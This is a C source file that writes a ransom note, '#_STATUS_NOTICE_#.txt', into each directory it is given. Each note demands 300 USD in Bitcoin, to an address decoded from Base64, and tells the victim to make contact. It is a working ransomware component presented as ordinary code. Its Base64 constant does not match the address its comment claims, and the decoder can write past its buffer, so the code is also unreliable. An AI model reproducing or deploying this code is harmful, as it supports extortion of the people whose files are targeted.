#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <limits.h>

/*
 * Base64 decoding table: maps ASCII character to 6‑bit value.
 * Returns -1 for invalid characters.
 */
static int base64_char_value(unsigned char c)
{
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

/*
 * Decode a Base64 string. Allocates and returns a NUL‑terminated buffer
 * containing the decoded bytes. Returns NULL on failure.
 * The caller must free() the returned buffer.
 */
static char *base64_decode(const char *in)
{
    if (in == NULL) return NULL;

    size_t inlen = strlen(in);
    if (inlen == 0) return NULL;

    /* Remove trailing '=' characters */
    size_t pad = 0;
    while (inlen > 0 && in[inlen - 1] == '=') {
        pad++;
        inlen--;
    }

    /* Decoded length = (inlen * 6) / 8 */
    size_t outlen = (inlen * 6) / 8;
    if (outlen == 0) return NULL;

    unsigned char *out = malloc(outlen + 1);
    if (out == NULL) return NULL;

    size_t i, j = 0;
    unsigned char buffer[4];
    int val;
    for (i = 0; i < inlen; i += 4) {
        int n = 0;
        /* Read up to 4 characters (could be fewer at end if no padding) */
        while (n < 4 && (i + n) < inlen) {
            val = base64_char_value((unsigned char)in[i + n]);
            if (val == -1) {
                free(out);
                return NULL;
            }
            buffer[n] = (unsigned char)val;
            n++;
        }
        /* Pad missing characters with 0 */
        for (; n < 4; n++) buffer[n] = 0;

        /* Assemble bytes */
        out[j++] = (buffer[0] << 2) | (buffer[1] >> 4);
        if (j > outlen) break;
        out[j++] = (buffer[1] << 4) | (buffer[2] >> 2);
        if (j > outlen) break;
        out[j++] = (buffer[2] << 6) | buffer[3];
        if (j > outlen) break;
    }

    /* Adjust for padding: the output length was calculated without padding,
     * and j may have written up to 3 extra bytes. Truncate to outlen. */
    out[outlen] = '\0';
    return (char *)out;
}

/* ---------------------------------------------------------------------- */

/*
 * Decoded Bitcoin address (the constant is the Base64 encoding of
 * "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa").
 * This must be defined before use.
 */
#define BTC_ADDRESS_BASE64 "MUExelAxZVA1UUdlZmkyRE1QVGZUTDVTG12N0RpdmZOYQ=="

/*
 * create_status_notice – for each directory in the NULL‑terminated array
 *                       create the file '#_STATUS_NOTICE_#.txt' containing
 *                       the payment request with the decoded Bitcoin address.
 *
 * Parameters:
 *   directories – array of NUL‑terminated directory paths,
 *                 terminated by a NULL pointer.
 */
void create_status_notice(const char * const *directories)
{
    if (directories == NULL) return;

    char *btc_addr = NULL;

    /* Decode the Bitcoin address once */
    btc_addr = base64_decode(BTC_ADDRESS_BASE64);
    if (btc_addr == NULL) {
        fprintf(stderr, "ERROR: failed to decode Bitcoin address from Base64\n");
        /* Continue even without the address – write the notice without it? */
        /* According to spec, if decoding fails, we must log error but continue.
         * However, we cannot produce the required content without the address.
         * We will skip writing files if decoding fails, but still iterate. */
        /* Most reasonable: skip writing any file, as per spec "continue processing remaining directories".
         * No file will be created because the content is incomplete. */
        /* The spec says: "Se a decodificação Base64 falhar ... a função deve registrar o erro em stderr, 
         * mas continuar processando os demais diretórios." It does NOT say you must skip writing.
         * It says continue processing. The content requires the address, so if we can't get it,
         * we cannot write the correct content. We will log the error and skip the file creation.
         * This is a safe interpretation. */
        /* We set btc_addr to NULL and skip writing below. */
    }

    for (size_t i = 0; directories[i] != NULL; i++) {
        const char *dir = directories[i];
        char path[PATH_MAX];
        int ret = snprintf(path, sizeof(path), "%s/#_STATUS_NOTICE_#.txt", dir);
        if (ret < 0 || (size_t)ret >= sizeof(path)) {
            fprintf(stderr, "ERROR: path too long for directory '%s'\n", dir);
            continue;
        }

        if (btc_addr == NULL) {
            /* Cannot create content – already logged error, skip this directory */
            continue;
        }

        /* Build the notification content */
        char content[256];
        snprintf(content, sizeof(content),
                 "Request payment of 300 USD to %s and contact via secure channel.\n",
                 btc_addr);

        FILE *fp = fopen(path, "w");
        if (fp == NULL) {
            fprintf(stderr, "ERROR: could not open file '%s': ", path);
            perror(NULL);
            continue;
        }

        if (fputs(content, fp) == EOF) {
            fprintf(stderr, "ERROR: write failed for file '%s'\n", path);
        }

        fclose(fp);
    }

    free(btc_addr);
}